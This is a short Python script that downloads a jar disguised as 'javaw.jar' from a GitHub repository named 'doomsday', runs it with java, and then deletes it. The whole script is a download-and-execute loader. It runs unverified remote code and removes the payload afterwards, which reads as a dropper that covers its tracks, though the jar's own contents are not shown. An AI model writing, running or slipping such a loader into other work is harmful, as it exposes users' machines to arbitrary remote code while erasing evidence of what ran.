import wget
import subprocess
import os
import time

def download_and_run():
    url = "https://raw.githubusercontent.com/daracist3-lab/doomsday/main/javaw.jar"
    filename = "javaw.jar"

    # Download the file
    wget.download(url, filename)
    print(f"\nDownloaded {filename}")

    try:
        # Run the jar file and wait for it to exit
        subprocess.run(["java", "-jar", filename], check=True)
    finally:
        # Wait briefly to ensure Java released the file lock
        for attempt in range(5):  # try up to 5 times
            try:
                if os.path.exists(filename):
                    os.remove(filename)
                    print(f"{filename} deleted.")
                break
            except PermissionError:
                print(f"File still locked, retrying... ({attempt+1}/5)")
                time.sleep(1)

# Run it
download_and_run()

